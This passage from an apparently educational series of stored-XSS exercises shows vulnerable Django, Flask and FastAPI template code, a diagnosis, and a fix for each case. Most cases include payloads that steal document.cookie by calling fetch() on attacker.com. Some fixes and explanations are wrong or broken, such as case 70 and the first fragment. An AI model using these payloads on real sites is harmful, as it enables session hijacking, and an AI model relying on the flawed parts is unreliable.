<!-- reviews.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Customer Reviews</h1>
    {% for review in reviews %}
        <div class="review">
            <strong>{{ review.author }}</strong>
            <span>{{ review.stars }} stars</span>
            <p>{{ review.body }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

1. Stored XSS. Missing escaping.

2. Below is a sample payload:

```
review.author: </strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>
review.body: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```

3. Below is the fix:

```
# views.py
from django.shortcuts import render
from django.utils.safestring import mark_safe
from .models import Review

def review_list(request):
    reviews = Review.objects.all()
    processed = []
    for review in reviews:
        processed.append({
            "author": review.author,
            "stars": review.stars,
            "body": review.body,
        })
    return render(request, "reviews.html", {"reviews": processed})
```

```
<!-- reviews.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Customer Reviews</h1>
    {% for review in reviews %}
        <div class="review">
            <strong>{{ review.author }}</strong>
            <span>{{ review.stars }} stars</span>
            <p>{{ review.body }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

Case 58:

```
# views.py
from django.shortcuts import render
from .models import Announcement

def announcements(request):
    items = Announcement.objects.all()
    return render(request, "announcements.html", {"items": items})
```

```
<!-- announcements.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Announcements</h1>
    {% autoescape off %}
        {% for item in items %}
            <div class="announcement">
                <h2>{{ item.title }}</h2>
                <p>{{ item.body }}</p>
                <small>Posted by: {{ item.author }}</small>
            </div>
        {% endfor %}
    {% endautoescape %}
</body>
</html>
```

1. Stored XSS. Missing escaping.

2. Below is a sample payload:

```
item.title: </h2><script>fetch('https://attacker.com/?q='+document.cookie);</script><h2>
item.body: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
item.author: attacker</small><script>fetch('https://attacker.com/?q='+document.cookie);</script><small>
```
{::comment}
</h2>
{:comment}

3. Below is the fix:


```
# views.py
from django.shortcuts import render
from .models import Announcement

def announcements(request):
    items = Announcement.objects.all()
    return render(request, "announcements.html", {"items": items})
```

```
<!-- announcements.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Announcements</h1>
        {% for item in items %}
            <div class="announcement">
                <h2>{{ item.title }}</h2>
                <p>{{ item.body }}</p>
                <small>Posted by: {{ item.author }}</small>
            </div>
        {% endfor %}
</body>
</html>
```

Case 59:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from .models import Product

def product_detail(request, product_id):
    product = Product.objects.get(id=product_id)
    badge = format_html(product.badge_html)
    return render(request, "product.html", {
        "product": product,
        "badge": badge,
    })
```

```
<!-- product.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>{{ product.name }}</h1>
    <p>{{ product.description }}</p>
    <div class="badge">{{ badge }}</div>
</body>
</html>
```

1. Stored XSS. Missing escaping. 

2. Below is a sample payload:

```
badge: <script>fetch('https://attacker.com?q='+document.cookie);</script>
```

3. Below is the fix:


```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from .models import Product

def product_detail(request, product_id):
    product = Product.objects.get(id=product_id)
    return render(request, "product.html", {
        "product": product
    })
```

```
<!-- product.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>{{ product.name }}</h1>
    <p>{{ product.description }}</p>
    <div class="badge">{{ product.badge_html }}</div>
</body>
</html>
```

Case 60:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from .models import Comment

def comment_list(request):
    comments = Comment.objects.all()
    rendered = []
    for comment in comments:
        rendered.append(
            format_html(
                f'<div class="comment"><strong>{comment.author}</strong>'
                f': {{}}</div>',
                comment.body
            )
        )
    return render(request, "comments.html", {"comments": rendered})
```

```
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in rendered %}
        {{ comment }}
    {% endfor %}
</body>
</html>
```

1. Stored XSS. Missing Escaping.

2. Below is the sample payload:

```
comment.author: </strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>
```

3. Below is the sample fix:


```
# views.py
from django.shortcuts import render
from .models import Comment

def comment_list(request):
    comments = Comment.objects.all()

    return render(request, "comments.html", {"comments": comments})
```

```
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in comments %}
        <div class="comment"><strong>{{ comment.author }}</strong>{{ comment.body }}
    {% endfor %}
</body>
</html>
```

Case 61

```
# models.py
from django.db import models
from django.utils.safestring import mark_safe

class UserProfile(models.Model):
	username = models.CharField(max_length=150)
	role     = models.CharField(max_length=50)

	def get_username_display(self):
		return mark_safe(self.username)


# views.py
from django.utils.html import format_html
from django.shortcuts import render
from .models import UserProfile

def profile_page(request, user_id):
	profile = UserProfile.objects.get(id=user_id)
	badge = format_html(
		'<span class="badge role-{}">{}</span>',
		profile.role,
		profile.get_username_display(),
	)
	return render(request, 'profile.html', {'badge': badge})
```

```
{# profile.html #}
<div class="profile-header">
	{{ badge }}
</div>
```

1. Stored XSS. Missing Escaping.

2. Below is a sample payload:

```
</span><img src=x onerror=\"fetch(\'https://attacker.com/?q=\'+document.cookie)\"><span>
```

3. Below is the fix:


```
# models.py
from django.db import models
from django.utils.safestring import mark_safe

class UserProfile(models.Model):
	username = models.CharField(max_length=150)
	role     = models.CharField(max_length=50)

	def get_username_display(self):
		return self.username


# views.py
from django.utils.html import format_html
from django.shortcuts import render
from .models import UserProfile

def profile_page(request, user_id):
	profile = UserProfile.objects.get(id=user_id)
	badge = format_html(
		'<span class="badge role-{}">{}</span>',
		profile.role,
		profile.get_username_display(),
	)
	return render(request, 'profile.html', {'badge': badge})
```

```
{# profile.html #}
<div class="profile-header">
	{{ badge }}
</div>
```

Case 62:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape
from .models import Notification

def notifications_page(request):
	notifications = Notification.objects.filter(
		user=request.user
	).values_list('message', flat=True)

	safe_notifications = [escape(msg) for msg in notifications]

	return render(request, 'notifications.html', {
		'notifications': safe_notifications,
	})
```

```
{# notifications.html #}
<script>
	const notifications = [
		{% for msg in notifications %}
			"{{ msg | safe }}",
		{% endfor %}
	];

	function renderNotifications() {
		const container = document.getElementById('notif-list');
		notifications.forEach(function(msg) {
			container.innerHTML += '<li>' + msg + '</li>';
		});
	}

	renderNotifications();
</script>

<ul id="notif-list"></ul>
```

1. Stored XSS. Wrong Context Escaping.
 
2. Below is a sample payload:

```
</li><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><li>
```

3. Below is the fix:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape
from .models import Notification

def notifications_page(request):
	notifications = Notification.objects.filter(
		user=request.user
	).values_list('message', flat=True)

	safe_notifications = [msg for msg in notifications]

	return render(request, 'notifications.html', {
		'notifications': safe_notifications,
	})
```

```
{# notifications.html #}
<script>
	const notifications = [
		{% for msg in notifications %}
			"{{ msg | escapejs }}",
		{% endfor %}
	];

	function renderNotifications() {
		const container = document.getElementById('notif-list');
		notifications.forEach(function(msg) {

			const li = document.createElement('li');

			li.textContent = msg;

			container.appendChild(li);
		
		});
	}

	renderNotifications();
</script>

<ul id="notif-list"></ul>
```

Case 63:

```
# utils.py
from markupsafe import Markup

def format_comment_preview(author, preview_text):
	"""Returns a formatted comment preview for display."""
	author_safe   = Markup(author)
	preview_safe  = Markup(preview_text)
	return Markup(
		'<span class="author">{}</span>: {}'
	).format(author_safe, preview_safe)


# views.py
from flask import render_template, request
from .models import Comment
from .utils import format_comment_preview

def comment_feed():
	comments = Comment.query.order_by(
		Comment.created_at.desc()
	).limit(20).all()

	previews = [
		format_comment_preview(c.author, c.preview_text)
		for c in comments
	]

	return render_template('feed.html', previews=previews)
```

```
{# feed.html #}
{% for preview in previews %}
	<div class="comment-card">
		{{ preview }}
	</div>
{% endfor %}
```

1. Stored XSS. Missing Escaping.

2. Below is a sample payload:

```
<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

3. Below is the fix:

```
# utils.py

# views.py
from flask import render_template, request
from .models import Comment

def comment_feed():
	comments = Comment.query.order_by(
		Comment.created_at.desc()
	).limit(20).all()


	return render_template('feed.html', previews=comments)
```

```
{# feed.html #}
{% for preview in previews %}
	<div class="comment-card">
		<span class="author">{{ preview.author }}</span>: {{ preview.preview_text }}
	</div>
{% endfor %}
```

Case 64:

```
# views.py
from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from .models import BlogPost

@login_required
def post_detail(request, post_id):
	post = BlogPost.objects.get(id=post_id)
	return render(request, 'post_detail.html', {'post': post})
```

```
{# post_detail.html #}
<h1>{{ post.title }}</h1>

<div id="share-bar"></div>

<script>
	var postTitle = "{{ post.title }}";
	var shareMsg  = "Check out: " + postTitle;

	function buildShareBar(msg) {
		document.getElementById('share-bar').innerHTML =
			'<button onclick="sharePost(\'' + msg + '\')">Share</button>';
	}

	buildShareBar(shareMsg);
</script>
```

1. Stored XSS. Wrong Context Escaping.

2. Below is a sample payload:

```
'\'); fetch('https://attacker.com/?q='+document.cookie) ; //
```

3. Below is the fix:


```
# views.py
from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from .models import BlogPost

@login_required
def post_detail(request, post_id):
	post = BlogPost.objects.get(id=post_id)
	return render(request, 'post_detail.html', {'post': post})
```

```
{# post_detail.html #}
<h1>{{ post.title }}</h1>

<div id="share-bar"></div>

<script>
	var postTitle = "{{ post.title | escapejs }}";
	var shareMsg  = "Check out: " + postTitle;

	function buildShareBar(msg) {
		const shareBar = document.getElementById('share-bar');

		const button = document.createElement('button');

		button.addEventListener('click', function() { sharePost(postTitle) } );

		button.textContent = "Share";

		shareBar.appendChild(button);
	}

	buildShareBar(shareMsg);
</script>
```

Case 65:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from .models import Product

def product_card(request, product_id):
	product = Product.objects.get(id=product_id)

	label = format_html(
		f'<span class="label label-{product.category}">'
		f'{product.name}'
		f'</span>'
	)

	return render(request, 'product_card.html', {
		'label': label,
		'product': product,
	})
```

```
{# product_card.html #}
<div class="product-card">
	{{ label }}
	<p>{{ product.description }}</p>
</div>
```

1. Stored XSS. Missing escaping.

2. Below are sample payloads:

```
product.name: </span><script>fetch('https://attacker.com/?q='+document.cookie);</script><span>
```

```
product.label: the"><script>fetch('https://attacker.com/?q='+document.cookie);</script><span>
```

3. Below is the fix:

```
# views.py
from django.shortcuts import render
from .models import Product

def product_card(request, product_id):
	product = Product.objects.get(id=product_id)

	return render(request, 'product_card.html', {
		'product': product
	})
```

```
{# product_card.html #}
<div class="product-card">
	<span class="label label-{{ product.category }}">{{ product.name }}</span>
	<p>{{ product.description }}</p>
</div>
```


Case 66:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from django.utils.safestring import mark_safe
from .models import Event

def event_banner(request, event_id):
	event = Event.objects.get(id=event_id)

	sponsor_html = mark_safe(event.sponsor_name)

	banner = format_html(
		'<div class="banner">'
		'<h2>{}</h2>'
		'<p>Sponsored by: {}</p>'
		'</div>',
		event.title,
		sponsor_html,
	)

	return render(request, 'event.html', {
		'banner': banner,
	})
```

```
{# event.html #}
<section class="event-section">
	{{ banner }}
</section>
```

1. Stored XSS. Missing Escaping for the `sponsor.html` argument

in `format.html`.

2. Below is a sample payload:

```
sponsor.html: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```


3. Below is the sample fix:

 
```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from django.utils.safestring import mark_safe
from .models import Event

def event_banner(request, event_id):
	event = Event.objects.get(id=event_id)

	return render(request, 'event.html', {
		'title': event.title,
		'sponsor': event.sponsor_name
	})
```

```
{# event.html #}
<section class="event-section">
	<div class="banner">
	<h2>{{ title }}</h2>
	<p>Sponsored by: {{ sponsor }}</p>
	</div>
</section>
```

Case 67:

```
# views.py
from flask import render_template
from .models import Review

def review_page(review_id):
	review = Review.query.get(review_id)
	return render_template('review.html',
		author=review.author,
		body=review.body,
	)
```

```
{# review.html #}
<div class="review">
	<p id="review-body"></p>
</div>

<script>
	var author = "{{ author | tojson }}";
	var body   = {{ body | tojson }};

	function renderReview() {
		var container = document.getElementById('review-body');
		container.innerHTML = "<strong>" + author + "</strong>: " + body;
	}

	renderReview();
</script>
```

1. Stored XSS. Wrong Context Escaping. Unnecessary enclosing of

`{{ author | tojson }}` in double quotes since `tojson` does this

automatically. Remember `tojson` is used for Javascript-context

escaping in popular frameworks such as Flask and FastAPI. Even

after removing the enclosed doubled quotes the `innerHTML` in

the frontend template still leaves the code vulnerable to XSS.

So the `innerHTML` has to be replaced with escaped HTML content.

2. Below is a sample payload:

```
author: </strong><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie);"><strong>
```

{::comment}
</strong>
{:comment}

3. Below is the fix:

```
# views.py
from flask import render_template
from .models import Review

def review_page(review_id):
	review = Review.query.get(review_id)
	return render_template('review.html',
		author=review.author,
		body=review.body,
	)
```

```
{# review.html #}
<div class="review">
	<p id="review-body"></p>
</div>

<script>
	var author = {{ author | tojson }};
	var body   = {{ body | tojson }};

	function renderReview() {

		var container = document.getElementById('review-body');

		const authorname = document.createElement('strong');

		authorname.textContent = author;

		const bodytext = document.createTextNode(`: ${body}`);

		container.appendChild(authorname);

		container.appendChild(bodytext);

	}

	renderReview();
</script>
```

Case 68:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html
from django.utils.safestring import mark_safe
from .models import UserProfile

def profile_badge(request, user_id):
	profile = UserProfile.objects.get(id=user_id)

	location = format_html('<em>{}</em>', profile.location)

	bio_preview = mark_safe(
		profile.bio[:100] if len(profile.bio) > 100
		else profile.bio
	)

	return render(request, 'profile_badge.html', {
		'username': profile.username,
		'location': location,
		'bio_preview': bio_preview,
	})
```

```
{# profile_badge.html #}
<div class="badge">
	<h3>{{ username }}</h3>
	<p>{{ location }}</p>
	<p>{{ bio_preview }}</p>
</div>
```

1. Stored XSS. Missing escaping for `bio_preview`. The `mark_safe()`

tells Django that `bio_preview` is safe for HTML execution provided

the input is larger than 100 characters (Why would the developer

do that?).

2. Below is a sample payload:

```
bio_preview: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p></p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```

3. Below is the fix:

```
# views.py
from django.shortcuts import render
from .models import UserProfile

def profile_badge(request, user_id):
	
	profile = UserProfile.objects.get(id=user_id)

	return render(request, 'profile_badge.html', {
		'username': profile.username,
		'location': profile.location,
		'bio_preview': profile.bio,
	})
```

```
{# profile_badge.html #}
<div class="badge">
	<h3>{{ username }}</h3>
	<p><em>{{ location }}</em></p>
	<p>{{ bio_preview }}</p>
</div>
```

Case 69:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from .models import get_post_by_id

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/post/{post_id}")
async def post_detail(request: Request, post_id: int):
	post = get_post_by_id(post_id)
	return templates.TemplateResponse("post.html", {
		"request": request,
		"title":   post.title,
		"author":  post.author,
		"tags":    post.tags,
	})
```

```
{# post.html #}
<div id="post-header"></div>
<div id="tag-list"></div>

<script>
	var title  = "{{ title | tojson }}";
	var author = {{ author | tojson }};
	var tags   = {{ tags | tojson }};

	function renderHeader() {
		document.getElementById('post-header').innerHTML =
			'<h1>' + title + '</h1>' +
			'<p>By: ' + author + '</p>';
	}

	function renderTags() {
		var html = '';
		tags.forEach(function(tag) {
			html += '<span class="tag">' + tag + '</span>';
		});
		document.getElementById('tag-list').innerHTML = html;
	}

	renderHeader();
	renderTags();
</script>
```

1. Stored XSS. Wrong Context Escaping in initializtion of `title`.

Also Missing Escaping for DOM sink in both `renderHeader()` and

`renderTags()`.

2. Below are sample payloads:

```
title: </h1><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><h1>
author: </p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><p>
tag: </span><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><span>
```

{::comment}
</span>
{:comment}

3. Below is the fix:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from .models import get_post_by_id

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/post/{post_id}")
async def post_detail(request: Request, post_id: int):
	post = get_post_by_id(post_id)
	return templates.TemplateResponse("post.html", {
		"request": request,
		"title":   post.title,
		"author":  post.author,
		"tags":    post.tags,
	})
```

```
{# post.html #}
<div id="post-header"></div>
<div id="tag-list"></div>

<script>
	var title  = {{ title | tojson }};
	var author = {{ author | tojson }};
	var tags   = {{ tags | tojson }};

	function renderHeader() {

		const postheader = document.getElementById('post-header');

		const titlehead = document.createElement('h1');

		titlehead.textContent = `${title}`;

		const authorp = document.createElement('p');

		authorp.textContent = `By: ${author}`;

		postheader.appendChild(titlehead);		
		
		postheader.appendChild(authorp);		

	}

	function renderTags() {

		const taglist = document.getElementById('tag-list');

		tags.forEach(function(tag) {

			const spantag = document.createElement('span');
		
			spantag.className = "tag";

			spantag.textContent = tag;

			taglist.appendChild(spantag);

		});
		
	}

	renderHeader();

	renderTags();
</script>
```

Case 70:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape
from django.http import JsonResponse
from .models import Comment

def submit_comment(request):
	if request.method == 'POST':
		body = request.POST.get('body', '')
		safe_body = escape(body)
		Comment.objects.create(
			user=request.user,
			body=safe_body,
		)
	return redirect('comment_list')


def comment_list(request):
	comments = Comment.query.order_by(
		Comment.created_at.desc()
	).all()
	return render(request, 'comments.html', {
		'comments': comments,
	})


def comment_api(request):
	comments = Comment.objects.all().values('user__username', 'body')
	return JsonResponse({'comments': list(comments)})
```

```
{# comments.html #}
{% for comment in comments %}
	<div class="comment">
		<p>{{ comment.body }}</p>
	</div>
{% endfor %}
```
1. Stored XSS. 

Also HTML escaping in the backend for `escape(body)` causes

display issues in the frontend.

2. No relevant payload:


3. Below is the bug fix:

```
# views.py
from django.shortcuts import render
from django.http import JsonResponse
from .models import Comment

def submit_comment(request):
	if request.method == 'POST':
		request_body = request.POST.get('body', '')
		Comment.objects.create(
			user=request.user,
			body=request_body,
		)
	return redirect('comment_list')


def comment_list(request):
	comments = Comment.query.order_by(
		Comment.created_at.desc()
	).all()
	return render(request, 'comments.html', {
		'comments': comments,
	})


def comment_api(request):
	comments = Comment.objects.all().values('user__username', 'body')

	return JsonResponse({'comments': list(comments)})
```

```
{# comments.html #}
{% for comment in comments %}
	<div class="comment">
		<p>{{ comment.body }}</p>
	</div>
{% endfor %}
```
